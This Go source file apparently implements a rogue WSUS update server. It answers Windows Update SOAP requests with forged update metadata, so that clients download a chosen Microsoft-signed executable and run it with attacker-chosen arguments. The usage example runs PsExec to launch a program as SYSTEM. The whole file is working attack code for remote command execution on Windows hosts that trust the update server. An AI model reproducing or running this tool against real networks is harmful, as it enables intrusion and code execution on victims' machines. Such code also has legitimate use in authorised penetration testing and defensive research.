package main

import (
	"bytes"
	"crypto/sha1"
	"crypto/sha256"
	"encoding/base64"
	"fmt"
	"html"
	"io"
	"io/ioutil"
	"log"
	"math/rand"
	"net/http"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"time"

	"github.com/google/uuid"
	flags "github.com/jessevdk/go-flags"
)

var getConfigXml string
var getCookieXml string
var registerComputerXml string
var syncUpdateXml string
var getExtendedUpdateInfoXml string
var reportEventBatchXml string
var getAuthorizationCookieXml string

var executeCommand string
var filePath string
var serverAddress string
var serverPort string

var opts struct {
	Host       []string `short:"H" long:"host" description:"The listening adress." default:"127.0.0.1"`
	Port       []string `short:"p" long:"port" description:"The listening port." default:"8530"`
	Executable []string `short:"e" long:"executable" description:"The Microsoft signed executable returned to the client." required:"true"`
	Command    []string `short:"c" long:"command" description:"The parameters for the current executable." required:"true"`
}

func getSHA256Binary(s []byte) []byte {
	r := sha256.Sum256(s)
	return r[:]
}

func setResourcesXml() {
	var f []byte
	u1, _ := uuid.NewRandom()
	u2, _ := uuid.NewRandom()
	u3, _ := uuid.NewRandom()

	ef, _ := ioutil.ReadFile(filePath)
	hash1 := sha1.Sum(ef)
	sha1Str := base64.StdEncoding.EncodeToString(hash1[:])
	hash256 := sha256.Sum256(ef)
	sha256Str := base64.StdEncoding.EncodeToString(hash256[:])

	var revisionIds []string = []string{strconv.Itoa(999999 - rand.Intn(99999)), strconv.Itoa(999999 - rand.Intn(99999))}
	var deploymentIds []string = []string{strconv.Itoa(99999 - rand.Intn(19999)), strconv.Itoa(99999 - rand.Intn(19999))}

	fileSize := strconv.Itoa(len(ef))
	fileName := filepath.Base(filePath) + ".exe"
	fileDownloadURL := "http://" + serverAddress + ":" + serverPort + "/" + u3.String() + "/" + fileName

	lastChangeDate := time.Now().Add(time.Duration(24) * time.Hour * -3).Format(time.RFC3339)
	expireDate := time.Now().Add(time.Duration(24) * time.Hour * 1).Format(time.RFC3339)
	cookieValue := base64.StdEncoding.EncodeToString([]byte(strings.Repeat("A", 47)))

	f, _ = ioutil.ReadFile("./resources/get-config.xml")
	getConfigXml = strings.NewReplacer("{lastChange}", lastChangeDate).Replace(string(f))

	f, _ = ioutil.ReadFile("./resources/get-cookie.xml")
	getCookieXml = strings.NewReplacer("{expire}", expireDate, "{cookie}", cookieValue).Replace(string(f))

	f, _ = ioutil.ReadFile("./resources/register-computer.xml")
	registerComputerXml = string(f)

	f, _ = ioutil.ReadFile("./resources/sync-updates.xml")
	syncUpdateXml = strings.NewReplacer("{revision_id1}", revisionIds[0], "{revision_id2}", revisionIds[1],
		"{deployment_id1}", deploymentIds[0], "{deployment_id2}", deploymentIds[1],
		"{uuid1}", u1.String(), "{uuid2}", u2.String(),
		"{expire}", expireDate, "{cookie}", cookieValue).Replace(string(f))
	fmt.Println(revisionIds)

	f, _ = ioutil.ReadFile("./resources/get-extended-update-info.xml")
	getExtendedUpdateInfoXml = strings.NewReplacer("{revision_id1}", revisionIds[0], "{revision_id2}", revisionIds[1],
		"{sha1}", sha1Str, "{sha256}", sha256Str, "{filename}", fileName,
		"{file_size}", fileSize, "{command}", html.EscapeString(html.EscapeString(executeCommand)), "{url}", fileDownloadURL).Replace(string(f))

	f, _ = ioutil.ReadFile("./resources/report-event-batch.xml")
	reportEventBatchXml = string(f)

	f, _ = ioutil.ReadFile("./resources/get-authorization-cookie.xml")
	getAuthorizationCookieXml = strings.NewReplacer("{cookie}", cookieValue).Replace(string(f))
}

func rootHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method == http.MethodGet || r.Method == http.MethodHead {
		doHeadOrGet(w, r)
	} else if r.Method == http.MethodPost {
		doPost(w, r)
	} else {
		w.WriteHeader(http.StatusMethodNotAllowed)
	}
}

func wsusBaseServer() {
	setResourcesXml()

	http.HandleFunc("/", rootHandler)
	fmt.Printf("Starting server...\n")

	if err := http.ListenAndServe(":"+serverPort, nil); err != nil {
		log.Fatal("Server Run Failed.: ", err)
	}
}

func doHeadOrGet(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Cache-Control", "private")
	w.Header().Set("X-AspNet-Version", "4.0.30319")
	w.Header().Set("X-Powered-By", "ASP.NET")

	if strings.Contains(r.RequestURI, ".exe") {
		w.Header().Set("Content-type", "application/octet-stream")
		if r.Method == "GET" {
			fmt.Printf("GET request,\nPath: %s\n", r.RequestURI)
			ef, _ := ioutil.ReadFile(filePath)
			w.WriteHeader(http.StatusOK)
			w.Write(ef)
		} else {
			//if Header is HEAD
			fmt.Printf("HEAD request,\nPath: %s\n", r.RequestURI)
			w.WriteHeader(http.StatusOK)
			w.Write(nil)
		}
	} else {
		w.Header().Set("Content-type", "text/xml; charset=utf-8")
		w.WriteHeader(http.StatusOK)
		w.Write(nil)
	}

}

func doPost(w http.ResponseWriter, r *http.Request) {
	soapAction := r.Header["Soapaction"][0]
	w.Header().Set("Content-type", "application/xml")
	bodyBuf := new(bytes.Buffer)
	io.Copy(bodyBuf, r.Body)
	fmt.Printf("POST request,\nPath: %s\nHeader: %s\nBody: %s\n", r.RequestURI, r.Header, bodyBuf)

	if soapAction == "\"http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService/GetConfig\"" {
		w.WriteHeader(http.StatusOK)
		w.Write([]byte(getConfigXml))
	} else if soapAction == "\"http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService/GetCookie\"" {
		w.WriteHeader(http.StatusOK)
		w.Write([]byte(getCookieXml))
	} else if soapAction == "\"http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService/RegisterComputer\"" {
		w.WriteHeader(http.StatusOK)
		w.Write([]byte(registerComputerXml))
	} else if soapAction == "\"http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService/SyncUpdates\"" {
		w.WriteHeader(http.StatusOK)
		w.Write([]byte(syncUpdateXml))
	} else if soapAction == "\"http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService/GetExtendedUpdateInfo\"" {
		w.WriteHeader(http.StatusOK)
		w.Write([]byte(getExtendedUpdateInfoXml))
	} else if soapAction == "\"http://www.microsoft.com/SoftwareDistribution/ReportEventBatch\"" {
		w.WriteHeader(http.StatusOK)
		w.Write([]byte(reportEventBatchXml))
	} else if soapAction == "\"http://www.microsoft.com/SoftwareDistribution/Server/SimpleAuthWebService/GetAuthorizationCookie\"" {
		w.WriteHeader(http.StatusOK)
		w.Write([]byte(getAuthorizationCookieXml))
	} else {
		w.Header().Del("Content-type")
		w.WriteHeader(http.StatusNotFound)
		w.Write(nil)
	}
}

func main() {
	_, err := flags.Parse(&opts)
	if err != nil {
		//log.Fatal(err)
		log.Fatal("Example: \ngowsus.exe -H X.X.X.X -p 8530 -e PsExec64.exe -c \"-accepteula -s calc.exe\"")
	}

	fmt.Printf("Host: %s\n", opts.Host)
	fmt.Printf("Port: %s\n", opts.Port)
	fmt.Printf("Executable: %s\n", opts.Executable)
	fmt.Printf("Command: %s\n", opts.Command)

	executeCommand = opts.Command[0]
	serverAddress = opts.Host[0]
	serverPort = opts.Port[0]
	filePath = opts.Executable[0]

	if _, err := os.Stat(filePath); err != nil {
		log.Fatal("Executable file not found.")
	}

	wsusBaseServer()
}
